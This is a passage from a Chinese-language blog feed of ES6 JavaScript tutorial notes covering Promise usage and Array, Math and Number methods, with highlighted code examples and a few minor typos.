class="line">  resolve(<span class="string">'ok'</span>);</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'test'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">promise</span><br><span class="line">  .then(<span class="function"><span class="keyword">function</span>(<span class="params">value</span>) </span>&#123; <span class="built_in">console</span>.log(value) &#125;)</span><br><span class="line">  .catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123; <span class="built_in">console</span>.log(error) &#125;);</span><br><span class="line"><span class="comment">// ok</span></span><br></pre></td></tr></table></figure><p>上面代码中：Promise在resolve语句后面，再抛出错误，不会被捕获，等同于没有抛出。因为Promise的状态一旦改变，就永久保持该状态，不会再改变了。</p><p>一般来说，不要在then方法里面定义Rejected失败状态的回调，应该使用catch语句</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bad</span></span><br><span class="line">promise</span><br><span class="line">  .then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// success</span></span><br><span class="line">  &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// error</span></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// good</span></span><br><span class="line">promise</span><br><span class="line">  .then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123; <span class="comment">//cb</span></span><br><span class="line">    <span class="comment">// success</span></span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(<span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// error</span></span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p>因为，Promise对象的错误具有冒泡性质，会一直向后传递，直到被捕获。错误总可以被catch语句捕获。</p><p>then catch语句更容易捕获错误，而且接近同步的写法（try/catch）语句。</p><h2 id="Promise-all"><a href="#Promise-all" class="headerlink" title="Promise.all()"></a>Promise.all()</h2><p>Promise.all方法用于将多个Promise实例，包装成一个新的Promise实例。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="built_in">Promise</span>.all([p1, p2, p3]);</span><br></pre></td></tr></table></figure><p>Promise.all的参数可以不是数组，但必须具有接口，且返回的每个成员都是Promise实例</p><p>p的状态有p1、p2、p3决定，分成两种情况</p><ul><li><p>只有p1、p2、p3的状态都变成fulfilled，p的状态才会变成fulfilled。此时p1、p2、p3的返回值组成一个数组，传递给p的回调</p></li><li><p>只要p1、p2、p3的状态有一个被rejected，p的状态就会变成rejected，此时，第一个被rejected的实例的返回值，会传递给p的回调</p></li></ul><h2 id="Promise-race"><a href="#Promise-race" class="headerlink" title="Promise.race()"></a>Promise.race()</h2><p>Promise.race方法同样是将多个Promise实例，包装成一个新的Promise实例。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="built_in">Promise</span>.race([p1, p2, p3]);</span><br></pre></td></tr></table></figure><h2 id="Promise-resolve"><a href="#Promise-resolve" class="headerlink" title="Promise.resolve()"></a>Promise.resolve()</h2><p>有时需要将现有对象转为Promise对象，Promise.resolve方法就起到这个作用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> jsPromise = <span class="built_in">Promise</span>.resolve($.ajax(<span class="string">'/whatever.json'</span>));</span><br></pre></td></tr></table></figure><p>Promise.resolve等价于下面的写法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.resolve(<span class="string">'foo'</span>)</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> resolve(<span class="string">'foo'</span>))</span><br></pre></td></tr></table></figure><h2 id="Promise-reject"><a href="#Promise-reject" class="headerlink" title="Promise.reject()"></a>Promise.reject()</h2><p>Promise.reject方法也会返回一个新的Promise实例，状态未rejected</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="built_in">Promise</span>.reject(<span class="string">'出错了'</span>);</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> reject(<span class="string">'出错了'</span>))</span><br><span class="line"></span><br><span class="line">p.then(<span class="literal">null</span>, <span class="function"><span class="keyword">function</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(s)</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 出错了</span></span><br></pre></td></tr></table></figure><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>将图片的加载写成一个Promise，一旦加载完成，Promise的状态就发生变化。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> preloadImage = <span class="function"><span class="keyword">function</span> (<span class="params">path</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> image = <span class="keyword">new</span> Image();</span><br><span class="line">    image.onload  = resolve;</span><br><span class="line">    image.onerror = reject;</span><br><span class="line">    image.src = path;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      ES6中的promise对象及用法
    
    </summary>
    
    
      <category term="ES6" scheme="http://pimichen.com/blog/tags/es6/"/>
    
  </entry>
  
  <entry>
    <title>ES6 array方法</title>
    <link href="http://pimichen.com/blog/es6/es6-array%E6%96%B9%E6%B3%95.html"/>
    <id>http://pimichen.com/blog/es6/es6-array方法.html</id>
    <published>2018-10-19T16:00:00.000Z</published>
    <updated>2018-10-19T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>参考：<a href="http://es6.ruanyifeng.com/#docs/array" target="_blank" rel="noopener">阮一峰 ES6 Array方法</a></p></blockquote><ul><li><p>Array.from()：将两类对象（类似数组的对象和可遍历的对象）转为真正的数组</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arrayLike = &#123;</span><br><span class="line">  <span class="string">'0'</span>: <span class="string">'a'</span>,</span><br><span class="line">  <span class="string">'1'</span>: <span class="string">'b'</span>,</span><br><span class="line">  <span class="string">'2'</span>: <span class="string">'c'</span>,</span><br><span class="line">  length: <span class="number">3</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES5的写法：</span></span><br><span class="line"><span class="keyword">var</span> arr1 = [].slice.call(arrayLike); <span class="comment">// ['a', 'b', 'c']</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6的写法：</span></span><br><span class="line"><span class="keyword">let</span> arr2 = <span class="built_in">Array</span>.from(arrayLike); <span class="comment">// ['a', 'b', 'c']</span></span><br></pre></td></tr></table></figure></li><li><p>Array.of()：将一组值转换成数组</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.of(<span class="number">3</span>, <span class="number">11</span>, <span class="number">8</span>) <span class="comment">// [3,11,8]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.of(<span class="number">3</span>) <span class="comment">// [3]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.of(<span class="number">3</span>).length <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.of() <span class="comment">// []</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.of(<span class="literal">undefined</span>) <span class="comment">// [undefined]</span></span><br></pre></td></tr></table></figure></li><li><p>copyWithin()：将指定位置的成员复制到其他位置（会覆盖原有成员），然后返回当前数组</p><p>Array.prototype.copyWithin(target, start = 0, end = this.length)</p><p>target（必需）：从该位置开始替换数据。</p><p>start（可选）：从该位置开始读取数据，默认为0。如果为负值，表示倒数。</p><p>end（可选）：到该位置前停止读取数据，默认等于数组长度。如果为负值，表示倒数。正从0开始，负从-1开始。</p><p>这三个参数都应该是数值，如果不是，会自动转为数值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>].copyWithin(<span class="number">0</span>, <span class="number">3</span>)  <span class="comment">// [4, 5, 3, 4, 5]</span></span><br><span class="line"><span class="comment">// 从3号位直到数组结束的成员（4和5），复制到从0号位开始的位置，结果覆盖了原来的1和2</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>].copyWithin(<span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>) <span class="comment">// [4, 2, 3, 4, 5]</span></span><br><span class="line"><span class="comment">// 将3号位复制到0号位</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>].copyWithin(<span class="number">0</span>, <span class="number">-2</span>, <span class="number">-1</span>) <span class="comment">// [4, 2, 3, 4, 5]</span></span><br><span class="line"><span class="comment">// -2相当于3号位，-1相当于4号位</span></span><br><span class="line"></span><br><span class="line">[].copyWithin.call(&#123;<span class="attr">length</span>: <span class="number">5</span>, <span class="number">3</span>: <span class="number">1</span>&#125;, <span class="number">0</span>, <span class="number">3</span>) <span class="comment">// &#123;0: 1, 3: 1, length: 5&#125;</span></span><br><span class="line"><span class="comment">// 将3号位复制到0号位</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> i32a = <span class="keyword">new</span> <span class="built_in">Int32Array</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]); i32a.copyWithin(<span class="number">0</span>, <span class="number">2</span>); <span class="comment">// Int32Array [3, 4, 5, 4, 5]</span></span><br><span class="line"><span class="comment">// 将2号位到数组结束，复制到0号位</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 对于没有部署TypedArray的copyWithin方法的平台</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 需要采用下面的写法:</span></span><br><span class="line"></span><br><span class="line">[].copyWithin.call(<span class="keyword">new</span> <span class="built_in">Int32Array</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]), <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>); <span class="comment">// Int32Array [4, 2, 3, 4, 5]</span></span><br></pre></td></tr></table></figure></li><li><p>find()：用于找出第一个符合条件的数组成员</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">-5</span>, <span class="number">10</span>, <span class="number">-1</span>].find(<span class="function">(<span class="params">n</span>) =&gt;</span> n &lt; <span class="number">0</span>) <span class="comment">// -5</span></span><br><span class="line"><span class="comment">// 找出数组中第一个小于0的成员，-1布什第一个，不返回。</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">15</span>].find(<span class="function"><span class="keyword">function</span>(<span class="params">value, index, arr</span>) </span>&#123;  </span><br><span class="line">  <span class="keyword">return</span> value &gt; <span class="number">9</span>;</span><br><span class="line">&#125;) <span class="comment">// 10</span></span><br><span class="line"><span class="comment">// 找出大于9的，15不是第一个，不返回</span></span><br></pre></td></tr></table></figure></li><li><p>findIndex()：返回第一个符合条件的数组成员的位置，如果所有成员都不符合条件，则返回-1</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">15</span>].findIndex(<span class="function"><span class="keyword">function</span>(<span class="params">value, index, arr</span>) </span>&#123;  </span><br><span class="line">  <span class="keyword">return</span> value &gt; <span class="number">9</span>;</span><br><span class="line">&#125;) <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line">[<span class="literal">NaN</span>].indexOf(<span class="literal">NaN</span>) <span class="comment">// -1</span></span><br><span class="line"></span><br><span class="line">[<span class="literal">NaN</span>].findIndex(<span class="function"><span class="params">y</span> =&gt;</span> <span class="built_in">Object</span>.is(<span class="literal">NaN</span>, y)) <span class="comment">// 0</span></span><br></pre></td></tr></table></figure></li><li><p>fill()：使用给定值，填充一个数组</p><p>第二个参数（可选）表示替换起始位置，第三个参数（可选），表示结束位置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>].fill(<span class="number">7</span>) <span class="comment">// [7, 7, 7]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">3</span>).fill(<span class="number">7</span>) <span class="comment">// [7, 7, 7]</span></span><br><span class="line"></span><br><span class="line">[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>].fill(<span class="number">7</span>, <span class="number">1</span>, <span class="number">2</span>) <span class="comment">// ['a', 7, 'c']</span></span><br></pre></td></tr></table></figure></li><li><p>includes()：是否包含指定元素，es7语法，babel转换器已支持</p><p>第二个参数可选，表示指定搜索起始位置，从起始位置到结尾，默认为0，负数表示倒数；当大于数组长度，会重置为从0开始</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">2</span>);     <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">4</span>);     <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="literal">NaN</span>].includes(<span class="literal">NaN</span>); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">3</span>, <span class="number">3</span>);   <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">3</span>, <span class="number">-1</span>);   <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">2</span>, <span class="number">0</span>);    <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">2</span>, <span class="number">1</span>);    <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">2</span>, <span class="number">2</span>);    <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">2</span>, <span class="number">3</span>);    <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">2</span>, <span class="number">-1</span>);    <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">2</span>, <span class="number">-2</span>);    <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">2</span>, <span class="number">-3</span>);    <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">2</span>, <span class="number">-4</span>);    <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      es6中一些较常使用的数组方法
    
    </summary>
    
    
      <category term="ES6" scheme="http://pimichen.com/blog/tags/es6/"/>
    
  </entry>
  
  <entry>
    <title>ES6 math方法</title>
    <link href="http://pimichen.com/blog/es6/es6-math%E6%96%B9%E6%B3%95.html"/>
    <id>http://pimichen.com/blog/es6/es6-math方法.html</id>
    <published>2018-10-19T16:00:00.000Z</published>
    <updated>2018-10-19T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>参考：<a href="http://es6.ruanyifeng.com/#docs/number" target="_blank" rel="noopener">阮一峰 ES6 Math对象扩展</a></p></blockquote><ul><li><p>Math.trunc()：用于去除一个数的小数部分，返回整数部分</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Math</span>.trunc(<span class="number">4.1</span>) <span class="comment">// 4</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Math</span>.trunc(<span class="number">4.9</span>) <span class="comment">// 4</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Math</span>.trunc(<span class="number">-4.1</span>) <span class="comment">// -4</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Math</span>.trunc(<span class="number">-4.9</span>) <span class="comment">// -4</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Math</span>.trunc(<span class="number">-0.1234</span>) <span class="comment">// -0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Math</span>.trunc(<span class="string">'123.456'</span>) <span class="comment">// 123，数值字符串会先经过Number()方法转换成数值</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Math</span>.trunc(<span class="literal">NaN</span>);      <span class="comment">// NaN</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Math</span>.trunc(<span class="string">'foo'</span>);    <span class="comment">// NaN</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Math</span>.trunc();         <span class="comment">// NaN</span></span><br></pre></td></tr></table></figure></li><li><p>Math.sign()：判断一个输是正数、负数还是零</p><ul><li><p>参数为正数，返回+1；</p></li><li><p>参数为负数，返回-1；</p></li><li><p>参数为0，返回0；</p></li><li><p>参数为-0，返回-0;</p></li><li><p>其他值，返回NaN</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Math</span>.sign(<span class="number">-5</span>) <span class="comment">// -1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Math</span>.sign(<span class="number">5</span>) <span class="comment">// +1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Math</span>.sign(<span class="number">0</span>) <span class="comment">// +0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Math</span>.sign(<span class="number">-0</span>) <span class="comment">// -0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Math</span>.sign(<span class="literal">NaN</span>) <span class="comment">// NaN</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Math</span>.sign(<span class="string">'foo'</span>); <span class="comment">// NaN</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Math</span>.sign();  <span class="comment">// NaN</span></span><br></pre></td></tr></table></figure></li><li><p>Math.cbrt()：计算一个数的立方根</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Math</span>.cbrt(<span class="number">-1</span>) <span class="comment">// -1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Math</span>.cbrt(<span class="number">0</span>)  <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Math</span>.cbrt(<span class="number">1</span>)  <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Math</span>.cbrt(<span class="number">2</span>)  <span class="comment">// 1.2599210498948734  </span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Math</span>.cbrt(<span class="string">'8'</span>) <span class="comment">// 2，数值字符串会先经过Number转换</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Math</span>.cbrt(<span class="string">'hello'</span>) <span class="comment">// NaN</span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      es6中一些较常使用的数学方法
    
    </summary>
    
    
      <category term="ES6" scheme="http://pimichen.com/blog/tags/es6/"/>
    
  </entry>
  
  <entry>
    <title>ES6 number方法</title>
    <link href="http://pimichen.com/blog/es6/es6-number%E6%96%B9%E6%B3%95.html"/>
    <id>http://pimichen.com/blog/es6/es6-number方法.html</id>
    <published>2018-10-19T16:00:00.000Z</published>
    <updated>2018-10-19T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>参考：<a href="http://es6.ruanyifeng.com/#docs/number" target="_blank" rel="noopener">阮一锋 ES6 Number方法</a></p></blockquote><ul><li><p>进制表示法</p><ul><li><p>二进制：前缀0b（或0B）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Number</span>(<span class="string">'0b111'</span>)  <span class="comment">// 7</span></span><br></pre></td></tr></table></figure></li><li><p>八进制：前缀0o（或0O）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Number</span>(<span class="string">'0o10'</span>) <span class="comment">// 8</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>Number.isInfinte()：检查一个数值是否为有限的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Number</span>.isFinite(<span class="number">15</span>); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.isFinite(<span class="literal">Infinity</span>); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.isFinite(-<span class="literal">Infinity</span>); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.isFinite(<span class="literal">NaN</span>); <span class="comment">// false，任何非数值都是无限的</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.isFinite(<span class="string">'foo'</span>); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.isFinite(<span class="string">'15'</span>); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.isFinite(<span class="literal">true</span>); <span class="comment">// false</span></span><br></pre></td></tr></table></figure></li><li><p>Number.isNan()：检查一个值是否为NaN</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Number</span>.isNaN(<span class="literal">NaN</span>) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.isNaN(<span class="number">9</span>/<span class="literal">NaN</span>) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.isNaN(<span class="string">'true'</span>/<span class="number">0</span>) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.isNaN(<span class="string">'true'</span>/<span class="string">'true'</span>) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.isNaN(<span class="number">15</span>) <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.isNaN(<span class="string">'15'</span>) <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.isNaN(<span class="literal">true</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure></li><li><p>Number.parseInt()：es6保持不变，转换成整型<br>Number.parseFloat()：es6保持不变，转换成浮点型</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ES5的写法</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">'12.34'</span>) <span class="comment">// 12</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">parseFloat</span>(<span class="string">'123.45#'</span>) <span class="comment">// 123.45</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6的写法</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.parseInt(<span class="string">'12.34'</span>) <span class="comment">// 12</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.parseFloat(<span class="string">'123.45#'</span>) <span class="comment">// 123.45</span></span><br></pre></td></tr></table></figure></li><li><p>Number.isInteger()：判断一个值是否为整数，js中3和3.0被视为同一个值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Number</span>.isInteger(<span class="number">25</span>) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Number</span>.isInteger(<span class="number">25.0</span>) <span class="comment">// 